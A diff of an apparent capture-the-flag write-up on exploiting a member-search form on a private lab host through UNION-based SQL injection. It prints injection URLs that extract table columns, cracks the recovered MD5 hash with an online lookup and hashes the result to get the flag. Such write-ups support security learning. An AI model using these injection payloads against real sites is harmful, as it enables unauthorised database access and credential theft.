@@ -7,10 +7,8 @@ In the http://192.168.1.32/?page=member page, there is a HTML form described as 
 </form>
 
 The title of the page is: "Search member by ID".
-I tried different IDs and I just found out that with id 5, I got a user that is call GetThe Flag.
+Try with different IDs and found out that with id=5, there is a user that is call GetThe Flag.
 There are good reasons to think the flag is located somewhere in the member table at the id 5.
-
-How can I trick the form to access the flag ?
 
 Step 1: Test Number of Columns: Start by testing if the UNION SELECT works with just numbers.
 http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201%20--%20&Submit=Submit#
@@ -45,11 +43,8 @@ http://192.168.1.32/?page=member&id=5%20UNION%20SELECT%201,CONCAT_WS(CHAR(32,58,
 Found out that the column "Commentaire" contain an instruction: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
 And the column "sountersign" contain an encrypted string "5ff9d0165b4f92b14994e5c685cdce28"
 
-Determine the Original Password using https://hashes.com/en/decrypt/hash
+Decrypt the original password using https://hashes.com/en/decrypt/hash
 5ff9d0165b4f92b14994e5c685cdce28:FortyTwo:MD5
 
-Pass it in lowercase:
-fortytwo
-
-Calculates hashes from the string:
+SHA256 on the lower case string "fortytwo" using https://emn178.github.io/online-tools/sha256.html
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
